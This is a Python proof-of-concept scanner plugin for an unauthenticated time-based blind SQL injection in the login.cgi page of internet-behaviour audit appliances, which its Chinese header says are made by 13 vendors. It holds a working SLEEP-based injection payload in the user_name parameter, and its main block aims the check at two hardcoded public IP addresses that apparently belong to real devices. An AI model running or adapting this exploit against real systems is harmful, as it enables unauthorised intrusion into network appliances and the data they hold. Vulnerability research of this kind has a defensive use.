#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 13家厂商（17种设备）网上行为(审计)设备系统通用型SQL注入(无需登录涉及网神&启明&神舟数码等)
Author    :  a
mail      :  a@lcx.cc
refer     :  http://wooyun.org/bugs/wooyun-2015-0122195

天玥网络安全审计系统
Netoray NSG 上网行为管理系统
Netoray SMB 企业易网通
Netoray NSG 上网行为管理系统
Netoray TOG 莱克斯带宽管理系统 V5.0
网神信息技术（北京）股份有限公司：
poweraegis 5500 上网行为管理系统
InforCube NSG 上讯上网行为管理系统
神州数码上网行为管理系统
VOLANS SR上网行为审计网关
瑞星上网行为管理系统
网御上网行为管理系统 Leadsec ACM
网睿兴安日志系统
艺创专业上网行为管理设备 e-strong ibm

"""
import urlparse
import time

def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    start_time1=time.time()
    code1, head, res, errcode, _ = curl.curl2(arg)
    true_time=time.time()-start_time1
    #print true_time
    start_time2=time.time()
    payload="login.cgi?act=login&user_name=admin%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))HcCu)%20AND%20%27zMcG%27=%27zMcG&user_pwd=admin&lang=zh_CN.UTF-8&t=0.9077004473656416&loginflag=1&ajax_rnd=01533054909668862846&user_name=[object%20HTMLInputElement]&session_id=undefined&lang=[object%20HTMLSelectElement]"
    target = arg + payload
    code2, head, res, errcode, _ = curl.curl2(target)
    flase_time=time.time()-start_time2
    if code1==200 and code2==200 and true_time<2 and flase_time>5:
        security_hole(target)
    

    

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'https://222.88.100.246/')[1])
    audit(assign('www', 'https://60.29.18.211:8443/')[1])